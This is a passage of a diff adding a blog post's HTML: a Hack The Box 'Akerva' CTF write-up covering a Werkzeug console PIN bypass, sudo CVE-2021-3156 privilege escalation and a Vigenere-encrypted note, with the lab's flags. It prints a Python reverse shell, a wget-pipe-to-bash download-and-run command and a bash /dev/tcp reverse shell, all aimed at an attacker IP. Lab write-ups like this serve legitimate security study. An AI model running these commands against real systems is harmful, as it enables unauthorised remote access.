+                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></div>
+<p>Having the correct PIN, it's possible to execute python commands from the <strong>/console</strong>:</p>
+<p><img alt="werkzeug-console.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/werkzeug-console.png"/></p>
+<h2 id="rce-and-reverse-shell">RCE and Reverse Shell</h2>
+<p>A reverse shell can be opened as follows:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">"10.10.14.13"</span><span class="p">,</span><span class="mi">8090</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">)</span>
+</code></pre></div>
+<p>However, since the standard output of the reverse shell conflicts with that of the flask application (other players bruteforce makes unusable the reverse shell), a reverse shell script is uploaded to the server and run by a separate process as follows:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">'wget -q -O - http://10.10.14.13:8000/shell | bash'</span><span class="p">)</span>
+</code></pre></div>
+<p>where <em>shell</em> is the following bash script:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash  </span>
+
+bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.10.14.13/8090<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></div>
+<p>The fifth flag is: <code>AKERVA{IKNOW#LFi_@_}</code></p>
+<p>Also, a second hidden flag is present in the user home:</p>
+<p><img alt="hidden-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/hidden-flag.png"/></p>
+<p>The sixth flag is: <code>AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}</code></p>
+<h2 id="sudo-privilege-escalation">SUDO Privilege Escalation</h2>
+<p>After unsuccessfully trying to crack various hashes , it seems that the sudo version on the server is vulnerable to various CVE:</p>
+<blockquote>
+<p>&gt; sudo --version
+Sudo version 1.8.21p2<br/>
+Sudoers policy plugin version 1.8.21p2<br/>
+Sudoers file grammar version 46<br/>
+Sudoers I/O plugin version 1.8.21p2  </p>
+</blockquote>
+<p>An <a href="https://github.com/worawit/CVE-2021-3156">exploit</a> for the CVE-2021-3156 is used in order to obtain root privileges:</p>
+<p><img alt="privesc.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/privesc.png"/></p>
+<p>The seventh flag is: <code>AKERVA{IkNow_Sud0_sUckS!}</code></p>
+<p>Also, an encrypted note is present in root home:</p>
+<p><img alt="secured-note.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/secured-note.png"/></p>
+<h2 id="secured-note">Secured Note</h2>
+<p>The encrypted note content is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="n">R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL</span>
+<span class="n">UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM</span>
+<span class="n">U1BNSUhITU9EQVVLSEUK</span>
+
+<span class="nv">@AKERVA_FR</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nv">@lydericlefebvre</span>
+</code></pre></div>
+<p>The note is base64-encoded:</p>
+<blockquote>
+<p>&gt; echo -n 'R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK' | base64 -d<br/>
+...<br/>
+GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE</p>
+</blockquote>
+<p>The encrypted note seems to use a <strong>Vigenere cipher</strong>.</p>
+<p>The cipher alphabet is the obtained as follows:</p>
+<p><img alt="note-alphabet.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/note-alphabet.png"/></p>
+<p><strong>The ordered alphabet is the following</strong>: <code>ACDEFGHIKLMNOPRSTUVWY</code>.</p>
+<p>Knowing that the note will contain the word "AKERVA", it's decrypted as follows:</p>
+<p><img alt="decrypted-note.png" src="http://localhost:1337/images/ctf/htb/fortresses/akerva/decrypted-note.png"/></p>
+<p>The last flag is: <code>AKERVA{IKNOOOWVIGEEENERRRE}</code></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2024 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
